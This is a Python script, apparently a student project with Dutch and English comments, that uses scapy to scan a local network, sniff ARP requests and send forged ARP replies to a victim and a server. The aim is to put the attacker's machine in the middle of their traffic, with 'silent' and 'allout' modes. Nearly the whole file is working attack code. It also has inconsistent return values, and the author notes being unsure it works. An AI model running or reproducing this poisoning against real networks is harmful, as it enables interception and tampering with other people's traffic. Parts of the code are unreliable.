import scapy.all as sc;
import argparse;
import time;
import ipaddress;

# TODO:
# - Mitm optie maken die je automatisch mitm maakt
# - Silent vs All out options

### This is the file for ARP poisoning. I'm not sure if it works or how to test it :) 
# first listen to ARP broadcast, then respond to victim, dan spam server with arp request, send victim a lot of arp responses and hope that we are the quickest.

# Example run code that should do something, where x is ip range: 
# python ARPpoisoning.py --scan x 
# When specific victim and server are found, where y and z are ip adresses: 
# python ARPpoisoning.py --victim y --server z


## First is my attempt at scanning the network. I'm not sure if this work and if this is what we wanted it to do if it does work.
# Scanning network for devices, this returns (or is supposed to return) all live hosts in a given range 'ip'.
def network_scan(ip_range, batch_threshold=256):
    hosts = []
    try:
        network = ipaddress.ip_network(ip_range, strict=False)
        
        if network.num_addresses <= batch_threshold:
            hosts.extend(_scan_single_range(str(network)))
        else:
            new_prefix = max(24, network.prefixlen)
            for subnet in network.subnets(new_prefix=new_prefix):
                print(f"Scanning {subnet}...")
                hosts.extend(_scan_single_range(str(subnet)))
    except ValueError as e:
        print(f"[!] Invalid IP range: {ip_range} - {e}")
    return hosts

def _scan_single_range(ip):
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / arp
    packet_pairs = sc.srp(final_packet, timeout=2, verbose=False)[0]
    hosts = []
    for sent, received in packet_pairs:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
    return hosts

## Here is where the main parts of the ARP poisoning is supposed to happen. 
# 1. We need to be able to start the poisoning attack.
# 2. We need to be able to get a current MAC adress. 
# 3. we need to stop the attack in a proper way.


# (2.) Get the MAC adress of a given IP adress
def get_mac(ip):
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp
    answered = sc.srp(packet, timeout=2, verbose=False, iface="enp0s3")[0]
    for _, received in answered:
        return received.hwsrc
    return None

def arp_poisoning(victim_ip, server_ip, mode):
    iface = "enp0s3"
    attacker_mac = sc.get_if_hwaddr(iface)
    victim_mac = None
    server_mac = None

    try:
        if victim_ip and not server_ip:
            print("Waiting for ARP from victim to discover server IP...")
            pkt = sc.sniff(filter="arp", iface=iface, store=1,
                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].psrc == victim_ip)[0]
            server_ip = pkt[sc.ARP].pdst
            victim_mac = get_mac(victim_ip)
            server_mac = get_mac(server_ip)

        elif not victim_ip and not server_ip:
            print("[Waiting for any ARP broadcast to discover both IPs...")
            pkt = sc.sniff(filter="arp", iface=iface, store=1,
                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].op == 1)[0]
            victim_ip = pkt[sc.ARP].psrc
            server_ip = pkt[sc.ARP].pdst
            victim_mac = get_mac(victim_ip)
            server_mac = get_mac(server_ip)

        else:
            victim_mac = get_mac(victim_ip)
            server_mac = get_mac(server_ip)
            print("Waiting for ARP broadcast from victim")
            pkt = sc.sniff(filter="arp", iface=iface, store=1,
                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].psrc == victim_ip and p[sc.ARP].pdst == server_ip)[0]

        if not victim_mac or not server_mac:
            print("[!] Could not resolve MAC addresses.")
            return None, None

        fake_packet_victim = sc.Ether(dst=victim_mac) / sc.ARP(
            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
        fake_packet_server = sc.ARP(op=2, pdst=server_ip, psrc=victim_ip, hwsrc=attacker_mac)

        if mode == "silent":
            print("Silent mode: sending one-time ARP poison")
            sc.sendp(fake_packet_victim, iface=iface, verbose=False)
        else:
            print("Allout mode: sending ARP poison repeatedly")
            for i in range(5):
                sc.sendp(fake_packet_victim, iface=iface, verbose=False)
                print(f"  [>] Poisoning round {i+1}")
                time.sleep(0.5)
        sc.send(fake_packet_server, iface=iface, verbose=False)
        return server_mac, victim_mac, server_ip, victim_ip

    except Exception as e:
        print(f"[!] Error during ARP poisoning: {e}")
        return None, None
    


def check_arp_server_client(pkt, server_ip, client_ip):
    if pkt.haslayer(sc.ARP):
        arp = pkt[sc.ARP]
        if arp.op == 1 and arp.psrc == client_ip and arp.pdst == server_ip:
            return True
    return False

def check_arp_client(pkt,client_ip):

    if pkt.haslayer(sc.ARP):
        arp = pkt[sc.ARP]
        if arp.op == 1 and arp.psrc == client_ip:
            return True
    return False
